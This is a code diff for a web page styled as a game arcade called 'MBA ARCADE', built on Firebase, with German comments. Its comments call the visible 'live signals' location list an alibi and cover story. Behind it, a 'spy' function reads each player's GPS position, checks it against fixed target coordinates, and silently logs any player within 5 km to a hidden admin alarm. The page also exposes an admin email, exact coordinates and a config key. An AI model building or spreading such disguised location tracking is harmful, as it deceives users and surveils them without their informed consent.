@@ -22,9 +22,18 @@
 
         h1 { color: #00ff00; text-shadow: 0 0 10px rgba(0,255,0,0.5); margin-bottom: 10px; text-align: center; }
         
+        /* --- STATUS ANZEIGE (NEU HINZUGEFÜGT) --- */
+        #status-display {
+            position: absolute; top: 15px; right: 15px;
+            padding: 8px 12px; border-radius: 5px; font-weight: bold; font-size: 0.9rem;
+            z-index: 1000; border: 1px solid #333; transition: all 0.3s;
+        }
+        .status-online { color: #00ff00; border-color: #00ff00; background: rgba(0,255,0,0.1); box-shadow: 0 0 10px rgba(0,255,0,0.2); }
+        .status-offline { color: #ff0000; border-color: #ff0000; background: rgba(255,0,0,0.1); box-shadow: 0 0 10px rgba(255,0,0,0.2); }
+
         /* --- LIVE LOCATION TICKER (DAS ALIBI) --- */
         .location-box {
-            width: 100%; max-width: 500px; margin-bottom: 20px;
+            width: 100%; max-width: 500px; margin-bottom: 20px; margin-top: 30px;
             border: 1px solid #333; background: #000; padding: 10px; border-radius: 5px;
             box-shadow: 0 0 10px rgba(0,255,0,0.1);
         }
@@ -34,7 +43,7 @@
         }
         .loc-list {
             display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;
-            font-size: 0.8rem; color: #fff;
+            font-size: 0.8rem; color: #fff; min-height: 20px;
         }
         .loc-chip {
             background: #111; border: 1px solid #444; padding: 3px 8px; border-radius: 4px;
@@ -117,10 +126,12 @@
 </head>
 <body>
 
+    <div id="status-display" class="status-online">ONLINE 🟢</div>
+
     <h1>MBA ARCADE</h1>
 
     <div id="admin-alarm-box" style="display:none; background:red; color:white; padding:15px; border-radius:5px; margin-bottom:20px; text-align:center; border: 2px solid white; animation: blink 1s infinite;">
-        🚨 <strong>ALARM! RADIUS VERLETZT!</strong><br>
+        🚨 <strong>ALARM! JGA RADIUS VERLETZT!</strong><br>
         <span id="intruder-details" style="font-size: 0.9rem;">...</span>
         <button onclick="dismissAlarm()" style="margin-top:10px; background:#333; color:white; border:1px solid white; padding:5px 10px; cursor:pointer;">Gesehen</button>
     </div>
@@ -128,10 +139,10 @@
     <div class="location-box">
         <div class="loc-header">
             <span>📡 LIVE SIGNALS (ACTIVE PLAYERS)</span>
-            <span id="loc-count">Scanning...</span>
+            <span id="loc-count">0</span>
         </div>
         <div id="location-list" class="loc-list">
-            <span style="color:#666;">Warte auf Signale...</span>
+            <span style="color:#666;">Scanne Satelliten...</span>
         </div>
     </div>
 
@@ -174,9 +185,9 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signOut, onAuthStateChanged, updatePassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-        // WICHTIG: setDoc hinzugefügt!
         import { getFirestore, collection, addDoc, doc, onSnapshot, query, where, getDocs, updateDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+        // --- FIREBASE KONFIGURATION ---
         const firebaseConfig = {
             apiKey: "AIzaSyASbziojAan2xJ3EoJ0RDPa9jh1Z-5UGX0",
             authDomain: "mba-arcade.firebaseapp.com",
@@ -189,6 +200,21 @@
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getFirestore(app); 
+
+        // --- ONLINE/OFFLINE ERKENNUNG (NEU) ---
+        function updateOnlineStatus() {
+            const statusEl = document.getElementById('status-display');
+            if (navigator.onLine) {
+                statusEl.innerText = "ONLINE 🟢";
+                statusEl.className = "status-online";
+            } else {
+                statusEl.innerText = "OFFLINE 🔴";
+                statusEl.className = "status-offline";
+            }
+        }
+        window.addEventListener('online', updateOnlineStatus);
+        window.addEventListener('offline', updateOnlineStatus);
+        updateOnlineStatus(); // Beim Start prüfen
 
         // --- AVATAR LOGIK ---
         const myAvatars = ["100.jpg", "102.jpg", "200.jpg", "205.jpg", "400.jpg"];
@@ -244,21 +270,19 @@
             if(viewName === 'profile') document.getElementById('view-profile').classList.add('active');
         }
 
-        // --- AUTH & INIT ---
+        // --- AUTH & HAUPTLOGIK ---
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 const name = user.email.replace("@mba-arcade.com", ""); 
                 document.getElementById("user-greeting").innerText = "Hallo " + name + "!";
                 
                 initProfile();
-                initLocationBoard(); // <-- DAS ALIBI STARTEN (Tabelle laden)
+                initLocationBoard(); // <-- DAS ALIBI STARTEN
 
                 if (user.email === ADMIN_EMAIL) {
                     initAdminWatch(user.email);
-                    // Optional: Auch als Admin Standort senden, damit es echt wirkt
-                    // initSpySystem(name); 
                 } else {
-                    initSpySystem(name); // <-- DER SPION & DATENLIEFERANT
+                    initSpySystem(name, user.email); // <-- SPY STARTEN
                 }
             } else {
                 window.location.href = "index.html";
@@ -269,17 +293,15 @@
             signOut(auth).then(() => window.location.href = "index.html");
         }
         
-        // --- DAS ERWEITERTE JGA & LOCATION SYSTEM ---
-
-        // KONFIGURATION (Deine JGA Koordinaten)
+        // --- JGA SYSTEM KONFIGURATION ---
         const ADMIN_EMAIL = "benedikt@mba-arcade.com"; 
         const TARGET_LAT = 49.473972; 
         const TARGET_LON = 8.534397;
         const ALARM_RADIUS_KM = 5;
 
-        // TEIL 1: DIE ÖFFENTLICHE ANZEIGE (Lesen)
+        // TEIL 1: ÖFFENTLICHE ANZEIGE (Lesen)
         function initLocationBoard() {
-            const q = query(collection(db, "public_locations")); // Holt alle Orte
+            const q = query(collection(db, "public_locations")); 
             onSnapshot(q, (snapshot) => {
                 const list = document.getElementById('location-list');
                 const count = document.getElementById('loc-count');
@@ -294,45 +316,41 @@
                 let counter = 0;
                 snapshot.forEach(doc => {
                     const data = doc.data();
-                    // Erzeugt schicke Chips: [ 📍 Berlin, DE ]
                     html += `<div class="loc-chip">📍 ${data.city}, ${data.country}</div>`;
                     counter++;
                 });
                 list.innerHTML = html;
                 count.innerText = counter;
+            }, (error) => {
+                console.error("Fehler beim Laden der Orte:", error);
             });
         }
 
-        // TEIL 2: DER SPION & DATEN-SENDER (Schreiben + Alarm)
-        function initSpySystem(userEmail) {
+        // TEIL 2: SPION & DATEN-SENDER
+        function initSpySystem(name, userEmail) {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // A) JGA ALARM PRÜFUNG (Nur wenn nicht Admin)
+                    // A) JGA ALARM
                     if (userEmail !== ADMIN_EMAIL) {
                         const dist = calculateDistance(TARGET_LAT, TARGET_LON, lat, lon);
-                        console.log("JGA Check:", dist.toFixed(1), "km");
                         if (dist <= ALARM_RADIUS_KM) {
                             triggerSilentAlarm(userEmail, dist);
                         }
                     }
 
-                    // B) DAS COVER-STORY FEATURE: Standortauflösung (Reverse Geocoding)
+                    // B) LOCATION LISTE UPDATE
                     try {
-                        // OpenStreetMap API fragen (kostenlos, keine Key nötig)
                         const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                         const data = await response.json();
                         
                         if(data && data.address) {
                             const city = data.address.city || data.address.town || data.address.village || "Unknown";
                             const country = data.address.country_code ? data.address.country_code.toUpperCase() : "??";
-
-                            // ID generieren: "Berlin_DE" (verhindert Doppelte)
                             const docId = `${city}_${country}`.replace(/[^a-zA-Z0-9]/g, "_");
                             
-                            // In DB schreiben (setDoc überschreibt existierende -> keine Duplikate!)
                             await setDoc(doc(db, "public_locations", docId), {
                                 city: city,
                                 country: country,
@@ -340,20 +358,18 @@
                             });
                         }
                     } catch (e) {
-                        console.error("Geo-Lookup Fehler (egal):", e);
+                        console.error("Geo-Fehler:", e);
                     }
 
-                }, (err) => console.log("Kein GPS Zugriff."));
+                }, (err) => console.log("Kein GPS erlaubt."));
             }
         }
 
-        // TEIL 3: DIE ZENTRALE (Alarm empfangen - nur Admin)
+        // TEIL 3: ADMIN ALARM ZENTRALE
         function initAdminWatch(userEmail) {
             if (userEmail !== ADMIN_EMAIL) return; 
-            console.log("Admin-Modus aktiviert.");
-
-            const q = query(collection(db, "security_logs"), where("viewed", "==", false));
             
+            const q = query(collection(db, "security_logs"), where("viewed", "==", false));
             onSnapshot(q, (snapshot) => {
                 if (!snapshot.empty) {
                     const latest = snapshot.docs[0].data();
@@ -367,3 +383,38 @@
                 }
             });
         }
+
+        // Hilfsfunktionen
+        window.dismissAlarm = async function() {
+            document.getElementById('admin-alarm-box').style.display = 'none';
+            const q = query(collection(db, "security_logs"), where("viewed", "==", false));
+            const snapshot = await getDocs(q);
+            snapshot.forEach(async (docSnap) => {
+                await updateDoc(doc(db, "security_logs", docSnap.id), { viewed: true });
+            });
+        }
+
+        async function triggerSilentAlarm(name, distance) {
+            const last = localStorage.getItem('last_jga_alarm');
+            const now = new Date().getTime();
+            if (last && (now - last) < 3600000) return; 
+
+            try {
+                await addDoc(collection(db, "security_logs"), { 
+                    intruder: name, distance: Math.round(distance), timestamp: new Date(), viewed: false 
+                });
+                localStorage.setItem('last_jga_alarm', now);
+            } catch(e) { console.error(e); }
+        }
+
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371; 
+            const dLat = (lat2 - lat1) * (Math.PI/180);
+            const dLon = (lon2 - lon1) * (Math.PI/180);
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                      Math.cos(lat1 * (Math.PI/180)) * Math.cos(lat2 * (Math.PI/180)) * Math.sin(dLon/2) * Math.sin(dLon/2); 
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)); 
+        }
+    </script>
+</body>
+</html>
